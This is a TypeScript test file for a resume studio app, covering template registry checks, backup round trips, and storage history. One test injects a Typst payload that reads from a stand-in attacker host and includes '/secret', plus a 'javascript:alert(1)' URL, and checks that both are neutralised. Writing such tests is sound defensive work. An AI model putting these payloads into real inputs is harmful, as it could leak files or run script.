import { afterEach, describe, expect, it } from 'vitest';
import { createTemplate, newId } from '@/domain/factories';
import { templateConfigSchema, variantSchema } from '@/domain/schemas';
import { legacyTemplateIds, typstTemplateIds } from '@/domain/template-ids';
import { selectTemplate, templateRegistry } from '@/domain/templates';
import { validate } from '@/domain/validation';
import { buildRenderModel } from '@/services/rendering/model';
import { typstProject } from '@/services/rendering/typst/adapter';
import {
  parseBackup,
  serializeBackup,
} from '@/services/interoperability/contracts';
import {
  parseImport,
  serializeYaml,
  makeBackup,
} from '@/services/interoperability/portability';
import { StudioDatabase } from '@/services/storage/database';
import { StudioRepository } from '@/services/storage/repository';
import { qaWorkspace } from './fixtures/qa-profiles';
const databases: StudioDatabase[] = [];
afterEach(async () => {
  await Promise.all(databases.splice(0).map((db) => db.delete()));
});
it('registers twelve unique versioned layouts and local preview assets', () => {
  expect(new Set(templateRegistry.map((t) => t.id)).size).toBe(12);
  expect(templateRegistry.filter((t) => t.engine === 'typst')).toHaveLength(8);
  for (const t of templateRegistry) {
    expect(t.version).toBe(1);
    expect(t.preview).toMatch(/^\/templates\/.*\.webp$/);
    expect(t.controls).toContain('margins');
    expect(t.paperSizes).toEqual(['A4', 'Letter']);
  }
});
it.each(legacyTemplateIds)('preserves the exact legacy %s contract', (id) => {
  const t = selectTemplate(createTemplate(), id);
  expect(t.schemaVersion).toBe(1);
  expect(t).not.toHaveProperty('templateVersion');
  expect(validate(templateConfigSchema, t)).toEqual(t);
  const { profile, variant } = qaWorkspace();
  variant.template = t;
  const b = makeBackup([profile], [variant]);
  expect(b.schemaVersion).toBe(1);
  expect(parseBackup(serializeBackup(b))).toEqual(b);
});
it.each(typstTemplateIds)(
  'round-trips %s in native JSON and YAML without changing career data',
  (id) => {
    const { profile, variant } = qaWorkspace();
    const before = structuredClone(variant);
    variant.template = selectTemplate(variant.template, id);
    expect(variant).toEqual({ ...before, template: variant.template });
    expect(validate(variantSchema, variant)).toEqual(variant);
    const b = makeBackup([profile], [variant]);
    expect(b.schemaVersion).toBe(2);
    expect(b.templateRegistryVersion).toBe(1);
    expect(parseImport(serializeYaml(b), 'resume.yaml').backup).toEqual(b);
    expect(parseBackup(serializeBackup(b))).toEqual(b);
    const back = selectTemplate(variant.template, 'classic');
    expect(back.schemaVersion).toBe(1);
    expect(back.hiddenSections).toEqual(before.template.hiddenSections);
    expect(back.sectionOrder).toEqual(before.template.sectionOrder);
    expect(() =>
      parseBackup(JSON.stringify({ ...b, schemaVersion: 1 })),
    ).toThrow();
  },
);
it('rejects mismatched and future template contract/version pairs', () => {
  const t = selectTemplate(createTemplate(), 'typst-ats-minimal');
  for (const bad of [
    { ...t, schemaVersion: 1 },
    { ...t, templateVersion: 2 },
    { ...t, templateVersion: undefined },
    { ...t, templateId: 'unknown' },
    { ...t, templateId: 'classic' },
  ])
    expect(templateConfigSchema.safeParse(bad).success).toBe(false);
});
it('serializes executable-looking career strings solely as JSON data', () => {
  const { profile, variant } = qaWorkspace();
  variant.template = selectTemplate(variant.template, 'typst-ats-minimal');
  const payload =
    '#read("https://attacker.invalid/x") #include "/secret" { } \\n [inert]';
  variant.summarySnapshot = payload;
  const project = typstProject(buildRenderModel(profile, variant));
  expect(project.source).not.toContain(payload);
  expect(
    JSON.parse(new TextDecoder().decode(project.data)).sections[0].text.replace(
      /\u200b/gu,
      '',
    ),
  ).toBe(payload);
  const model = buildRenderModel(profile, variant);
  model.sections[1]!.entries[0]!.url = 'javascript:alert(1)';
  expect(() => typstProject(model)).toThrow();
});
describe('transactional mixed-engine storage and history', () => {
  it('loads v1 records without rewriting them, saves Typst, restores pre-Typst revisions, and retains the versioned backup', async () => {
    const db = new StudioDatabase(`typst-${newId()}`);
    databases.push(db);
    const repo = new StudioRepository(db);
    const { profile, variant } = qaWorkspace();
    const original = structuredClone(variant);
    await db.profiles.add(profile);
    await db.variants.add(variant);
    expect(await repo.getVariant(variant.id)).toEqual(original);
    const changed = await repo.saveVariant(
      {
        ...variant,
        template: selectTemplate(variant.template, 'typst-modern-executive'),
      },
      variant.updatedAt,
    );
    const revisions = await repo.listRevisions(variant.id);
    expect(revisions[0]!.snapshot.template).toEqual(original.template);
    expect(await repo.getProfile(profile.id)).toEqual(profile);
    const saved = await repo.exportWorkspace();
    expect(saved.schemaVersion).toBe(2);
    const restored = await repo.restoreRevision(
      revisions[0]!.id,
      changed.updatedAt,
    );
    expect(restored.template).toEqual(original.template);
    expect(restored.selections).toEqual(original.selections);
    const withHistory = await repo.exportWorkspace();
    expect(withHistory.schemaVersion).toBe(2);
    expect(
      parseImport(serializeYaml(withHistory), 'history.yaml').backup,
    ).toEqual(withHistory);
    const destination = new StudioDatabase(`typst-import-${newId()}`);
    databases.push(destination);
    const target = new StudioRepository(destination);
    await target.applyImport(
      withHistory,
      'replace',
      JSON.stringify([[], [], []]),
    );
    expect((await target.getVariant(variant.id)).template).toEqual(
      original.template,
    );
    expect((await target.exportWorkspace()).revisions).toEqual(
      withHistory.revisions,
    );
  });
});
